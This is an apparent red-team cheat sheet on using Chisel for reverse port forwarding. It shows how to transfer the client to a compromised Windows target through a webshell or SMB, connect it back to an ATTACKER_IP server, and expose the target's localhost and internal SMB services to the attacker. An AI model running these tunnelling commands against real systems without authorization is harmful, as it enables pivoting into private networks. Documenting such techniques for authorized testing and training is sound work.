# Basic Reverse Port Forward

### Scenario

Target has a service bound to:

127.0.0.1:8888

You want to access it locally on:

localhost:8888

---

# 1. Start Chisel Server (Attacker)

chisel server -p 9999 --reverse

Explanation:

|Option|Meaning|
|---|---|
|`server`|Run in server mode|
|`-p 9999`|Listen on port 9999|
|`--reverse`|Allow reverse port forwarding|

Output should show:

Listening on http://0.0.0.0:9999

---

# 2. Transfer Chisel to Target

Example download:

wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz

Extract:

gunzip chisel_1.10.1_windows_amd64.gz

Upload to target (webshell / smb / etc).

---

# 3. Run Chisel Client (Target)

chisel.exe client ATTACKER_IP:9999 R:8888:127.0.0.1:8888

Explanation:

|Section|Meaning|
|---|---|
|`client`|Run in client mode|
|`ATTACKER_IP:9999`|Connect to attacker server|
|`R:`|Reverse port forward|
|`8888`|Port opened on attacker|
|`127.0.0.1:8888`|Target local service|

---

# 4. Access the Service

From attacker machine:

localhost:8888

You are now connected to:

target:127.0.0.1:8888

---

# Visual Flow

Attacker                Target  
--------                --------  
  
chisel server           chisel client  
-p 9999 --reverse  <--- connect  
  
localhost:8888  <-----> 127.0.0.1:8888

---

# Common Variants

### Forward Target Port to Attacker

R:ATTACKER_PORT:TARGET_IP:TARGET_PORT

Example:

R:8080:127.0.0.1:80

---

### Forward Internal Network Service

R:445:10.10.10.5:445

Access internal SMB from attacker.

---

# Troubleshooting

### Check tunnel established

Server should show:

session: tun: proxy#R:8888=>8888

---

### Port already in use

Change local port:

R:9001:127.0.0.1:8888